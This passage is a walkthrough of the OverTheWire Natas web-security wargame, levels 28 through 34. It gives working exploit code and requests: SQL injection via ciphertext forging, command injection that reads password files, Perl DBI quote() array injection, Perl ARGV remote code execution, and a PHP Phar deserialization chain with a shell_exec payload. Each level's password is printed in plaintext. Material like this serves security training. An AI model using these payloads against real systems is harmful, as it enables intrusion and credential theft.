sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
data = {'query':sqli}
r = s.post(url, data=data)
exploit = urllib.parse.unquote(r.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# We computer the size of our payload
nblocks = len(sqli) - 10
while nblocks % 16 != 0:
    nblocks += 1 
nblocks = int(nblocks / 16)

# Then, we forge the query
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
resp = s.get(search_url, params={"query":final_ciphertext})

print(resp.text)
```

Yay !

```text
airooCaiseiyee8he8xongien9euhe8b
```

I have to admit that this one was challenging, it took me several days to get it right so, no worries if you don't get it right away !

## Решение Natas 29

**URL :** [http://natas29.natas.labs.overthewire.org](http://natas29.natas.labs.overthewire.org) <br/>
**Credentials :** *natas29:airooCaiseiyee8he8xongien9euhe8b*


In this challenge we got a page that display a large dump of text depending on what you choose on the dropdown. The interesting part is in the URL :

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground
```

It seems that a Perl script take a file name as an argument... let's try to inject the following command :

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
```

Ok, so it's a command injection. You can see the file listing at the bottom of the page. Note, that I used the *pipe* character to concat a command to the script.
![image-center](/images/otw/natas29_file_list.png){: .align-center}
Now, let's get the code of the **index.pl** with the following injection :

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+index.pl%00
```

After some cleanup, here is the interesting part of the code :

```perl
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

As you can see, if we try to read the password for the next level you won't get it as the code filter the keyword **natas**. However, by injecting the following command I managed to get the password :

```text
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00
````

Here you go !

```text
wie9iexae0Daihohv8vuu3cei9wahf0e
```

## Решение Natas 30

**URL :** [http://natas30.natas.labs.overthewire.org](http://natas30.natas.labs.overthewire.org) <br/>
**Credentials :** *natas30:wie9iexae0Daihohv8vuu3cei9wahf0e*

Here is the Perl code for this challenge :

```perl
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}

print <<END;
```

Here we got some *Perl* code that seems to connect to a database. It looks like a SQL Injection however, we need to find a way to bypass the *quote()* method. As per the documentation *quote()* escape any special characters (such as quotation marks) contained within the string.

Luckily, the *quote()* method is vulnerable to array injection. If you pass an array into this method, it will be treated as parameters. We'll need to write a Python script to inject an array.

```python
import requests

url = "http://natas30.natas.labs.overthewire.org/index.pl"

s = requests.Session()
s.auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')

args = { "username": "natas31", "password": ["'' or 1", 2] }
r = s.post(url,  data=args)
print (r.text)
```

Bingo !

```text
hay7aecuungiuKaezuathuk9biin0pu1
```

## Решение Natas 31

**URL :** [http://natas31.natas.labs.overthewire.org](http://natas31.natas.labs.overthewire.org) <br/>
**Credentials :** *natas31:hay7aecuungiuKaezuathuk9biin0pu1*

Here is the Perl code for this challenge :

```perl
f ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;
```

This script will let you upload a *.csv* and parse it into a nice table. It took me while to find the proper way to exploit this flaw, but I came across the following research [The Perl Jam 2](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf). 

In the context of the script if filename = **ARGV** the following line `while (<$file>)` will loop through the *argument* passed to the script inserting each one to an *open()* call, it means remote code execution !

To execute code, instead of sending **POST /index.pl**, we will send **POST /index.pl?\|\<command\>\|**. We need to append a **\|** at the end to make sure the argument is interpreted as a command.

We also, need to add the following block to the header of the **Submit** query :

```text
------WebKitFormBoundaryTB4tvLNySo6uAxMy
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
```

Here is the query :
![image-center](/images/otw/natas31_query.png){: .align-center}
And the answer (with the password):
![image-center](/images/otw/natas31_response.png){: .align-center}
Done !

```text
no1vohsheCaiv3ieH4em1ahchisainge
```

## Решение Natas 32

**URL :** [http://natas32.natas.labs.overthewire.org](http://natas32.natas.labs.overthewire.org) <br/>
**Credentials :** *natas32:no1vohsheCaiv3ieH4em1ahchisainge*

Here is the Perl code for this challenge :

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;
```

As you can see, the code is exactly the same as the previous challenge so, we'll use the same exploit. However, we need to find a binary in the **webroot** and execute it to get the password. First we need to send the following query to list the files in the **webroot** :

```text
POST /index.pl?/bin/ls%20-al%20.%20|
```

We got the following result :

```html
<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>total 180
</td></tr><tr><td>drwxr-x---  4 natas32 natas32  4096 Dec 15  2016 .
</td></tr><tr><td>drwxr-xr-x 41 root    root     4096 Oct 29 04:27 ..
</td></tr><tr><td>-rw-r-----  1 natas32 natas32   119 Dec 15  2016 .htaccess
</td></tr><tr><td>-rw-r-----  1 natas32 natas32   129 Oct 20 09:08 .htpasswd
</td></tr><tr><td>drwxr-x---  5 natas32 natas32  4096 Dec 15  2016 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx---  1 root    natas32  7168 Dec 15  2016 getpassword
</td></tr><tr><td>-rwxr-x---  1 natas32 natas32   235 Dec 15  2016 getpassword.c
</td></tr><tr><td>-rwxr-x---  1 natas32 natas32   236 Dec 15  2016 getpassword.c.tmpl
</td></tr><tr><td>-rwxr-x---  1 natas32 natas32  9667 Dec 15  2016 index-source.html
</td></tr><tr><td>-rwxr-x---  1 natas32 natas32  2952 Dec 15  2016 index-source.pl
</td></tr><tr><td>-rwxr-x---  1 natas32 natas32  2991 Dec 15  2016 index.pl
</td></tr><tr><td>-rwxr-x---  1 natas32 natas32  2952 Dec 15  2016 index.pl.tmpl
</td></tr><tr><td>-rwxr-x---  1 natas32 natas32 97180 Dec 15  2016 jquery-1.12.3.min.js
</td></tr><tr><td>-rwxr-x---  1 natas32 natas32 16877 Dec 15  2016 sorttable.js
</td></tr><tr><td>drwxr-x---  2 natas32 natas32  4096 Apr  5 16:49 tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The **getpassword** executable seems to be the right one. Let's try the following query :

```text
POST /index.pl?./getpassword%20|
```

It worked !

```text
shoogeiGa2yee3de6Aex8uaXeech5eey
```

## Решение Natas 33

**URL :** [http://natas33.natas.labs.overthewire.org](http://natas33.natas.labs.overthewire.org) <br/>
**Credentials :** *natas33:shoogeiGa2yee3de6Aex8uaXeech5eey*

Here is the PHP code for this challenge :

```php
<?php

class Executor{
    
    private $filename=""; 
    private $signature='adeafbadbabec0dedabada55ba55d00d';
    private $init=False;

    function __construct(){
        $this->filename=$_POST["filename"];
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
            echo "File is too big<br>";
        }
        else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                echo "Firmware upgrad initialised.<br>";
            }
            else{
                echo "There was an error uploading the file, please try again!<br>";
            }
        }
    }

    function __destruct(){
        // upgrade firmware at the end of this script

        // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
        if(md5_file($this->filename) == $this->signature){
        if(getcwd() === "/") chdir("/natas33/uploads/");
            echo "Congratulations! Running firmware update: $this->filename <br>";
                passthru("php " . $this->filename);
        }
        else{
                echo "Failur! MD5sum mismatch!<br>";
        }
    }
}
?>

// Second part of the code
<?php
    session_start();
    if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
        new Executor();
    }
?>
```

This one took me a while to figure out, but first let's analyse the code. The goal here is to upload a file that will be executed on the server if the **MD5** checksum matches the following value : **adeafbadbabec0dedabada55ba55d00d**.

Of course, even if **MD5** is vulnerable to collision, it would be useless to try to find a potential collision for `adeafbadbabec0dedabada55ba55d00d`. Even if it is theoretically possible, it could take years and your file would probably get bigger than the **4096 bytes** limit set in the code.

However, we do have control over 2 parameters, the *filename* and the file content, named *uploadedfile*. In the following code you can see that your filename is set on the client side with your **session_id** as default value :

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
    <input type="hidden" name="filename" value="<? echo session_id(); ?>" />
        Upload Firmware Update:<br/>
    <input name="uploadedfile" type="file" /><br />
    <input type="submit" value="Upload File" />
</form>
```

After some research, I came across the following paper [It’s a PHP unserialization vulnerability Jim, but not as we know it](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf) by Sam Thomas. Basically, he explains how to exploit the **phar://** stream wrapper and the **.phar** archive in PHP to unserialize data. 

What is interesting about Phar (PHP Archive) files is that these contain metadata in serialized format. If a file operation is now performed on an existing **Phar** file via the *phar://* stream wrapper, then its serialized meta data is unserialized. This means that an injected object in the metadata is loaded into the application’s scope.

Let's sum it up :

- We can upload any file type we want
- We have control over the filename
- *md5_file()* function can read *Phar* stream 

So, if we build a custom *Phar* archive with specific serialized data then, try to open it with the *phar://* stream wrapper, we could potentially get an execution.

I solved this one in 2 steps. First I uploaded a standard PHP file to read the password :

```php
<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
```

I intercepted the submit request to rename it with the name `pwn.php`. Then, I built a custom *Phar* archive with the following code :

```php
<?php
	class Executor {
		private $filename = "pwn.php"; 
        private $signature = True;
        private $init = false;
	}

	$phar = new Phar("test.phar");
	$phar->startBuffering();
	$phar->addFromString("test.txt", 'test');
	$phar->setStub("<?php __HALT_COMPILER(); ?>");
	$o = new Executor();
	$phar->setMetadata($o);
	$phar->stopBuffering();
?>
```

In this code, I modified the **filename** attribute to *pwn.php* and the **signature** attribute to *True*. By doing that the **MD5** comparison will always be true then, the **passthru()** function will execute the **pwn.php** :

```php
if(md5_file("pwn.php") == True){
    echo "Congratulations! Running firmware update: pwn.php <br>";
    passthru("php " . "pwn.php");
}
```

First, let's upload the PHP file and remame it using **Burp** :
![image-center](/images/otw/natas33_php_upload.png){: .align-center}
Then, upload the generated Phar archive and rename it:
![image-center](/images/otw/natas33_phar_upload.png){: .align-center}
Finally send the previous request to the Burp's Repeater tool and modify the filename to **phar://test.phar/test.txt** to force the *md5_file()* function to interpret the Phar archive.
![image-center](/images/otw/natas33_phar_exec.png){: .align-center}
Success !!

```text
shu5ouSu6eicielahhae0mohd4ui5uig
```

## Решение Natas 34

**URL :** [http://natas34.natas.labs.overthewire.org](http://natas34.natas.labs.overthewire.org) <br/>
**Credentials :** *natas34:shu5ouSu6eicielahhae0mohd4ui5uig*

Nothing to do here, you did it !

```text
Congratulations! You have reached the end... for now.
```
